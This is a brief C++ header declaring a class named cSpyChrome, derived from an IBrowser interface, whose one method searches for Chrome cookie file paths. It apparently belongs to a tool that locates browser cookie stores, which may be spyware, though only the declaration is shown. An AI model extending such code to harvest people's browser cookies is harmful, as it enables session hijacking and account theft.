#pragma once
#include "IBrowser.h"
class cSpyChrome :public IBrowser
{
public:
	cSpyChrome();
public:
	virtual void searchCookies(vector<string> &p_refvtstrCookiesPath);
};